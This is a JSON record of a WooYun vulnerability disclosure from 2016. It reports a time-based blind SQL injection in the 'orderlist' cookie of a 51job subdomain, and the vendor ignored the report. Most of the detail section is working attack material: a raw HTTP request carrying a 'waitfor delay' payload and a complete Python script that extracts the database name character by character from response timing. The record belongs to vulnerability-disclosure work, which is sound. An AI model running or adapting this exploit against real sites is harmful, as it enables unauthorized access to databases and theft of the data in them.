{"id": 87804, "wybug_id": "wooyun-2016-0218066", "wybug_title": "51job分站存在SQL注入                                      ", "wybug_corp": "前程无忧(51job)", "wybug_author": "路人甲", "wybug_date": "2016-06-10 18:51", "wybug_open_date": "2016-06-17 11:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-06-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-06-10：\t厂商已查看当前漏洞内容,细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-06-17：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 51job分站存在SQL注入 详细说明：  \nGET /order.html HTTP/1.1Cookie: ASPSESSIONIDQCCBRQDA=PAAEILKAFGNBCKPECJMAKPMM; readlist=196%2C25%2C294%2C340%2C307; orderlist=-1)%3Bif(ascii(substring(USER,1,1))>103)%20waitfor%20delay%20'0:0:10'%20--%20; Hm_lvt_2fb608bf1ad8b9b8ce2e04b58003184e=1465491620,1465491620,1465491621,1465491621; Hm_lpvt_2fb608bf1ad8b9b8ce2e04b58003184e=1465491621; HMACCOUNT=CE77C9E3D0040FF7X-Requested-With: XMLHttpRequestReferer: http://research.51job.com/Host: research.51job.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*\ncurrent result is h{{l\n#!/usr/bin/python# coding=utf-8import httplib,time,string,sys,random,urllibimport requestsdef getPayloadCookie(i,payload):    x = \"ASPSESSIONIDQCCBRQDA=PAAEILKAFGNBCKPECJMAKPMM; readlist=196%2C25%2C294%2C340%2C307; orderlist=-1)%3Bif(ascii(substring(DB_NAME(),\"+str(i)+\",1))>\"+str(ord(payload))+\")%20waitfor%20delay%20'0:0:10'%20--%20; Hm_lvt_2fb608bf1ad8b9b8ce2e04b58003184e=1465491620,1465491620,1465491621,1465491621; Hm_lpvt_2fb608bf1ad8b9b8ce2e04b58003184e=1465491621; HMACCOUNT=CE77C9E3D0040FF7\"    headers = {        'Host': 'research.51job.com',        'Accept': '*/*',        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',        'Accept-Encoding': 'gzip, deflate, sdch',        'Accept-Language': 'zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4',        'X-Requested-With': 'XMLHttpRequest',        'Referer': 'http://research.51job.com/',        'Connection': 'Keep-alive',        'Cookie': x    }    return headersdef exploit():    res = ''    url = 'http://research.51job.com/order.html'    payloads = ['@','_','.']+ list(string.ascii_lowercase)+list(string.ascii_uppercase) +[str(i) for i in range(10) ]    payloads = sorted(payloads,reverse=True)    for i in range(1,30,1):        for payload in payloads:            try:                headers = getPayloadCookie(i,payload)                response = requests.request(method='GET',url=url,headers=headers, timeout=3)                print chr(ord(payload)+1),                sys.stdout.flush()            except Exception,e:                res += chr(ord(payload)+1)                print \"\\ncurrent result is\",res                break    print resif __name__=='__main__':    exploit()    #getPayloadCookie(2,'a')\n   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-06-17 11:00 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}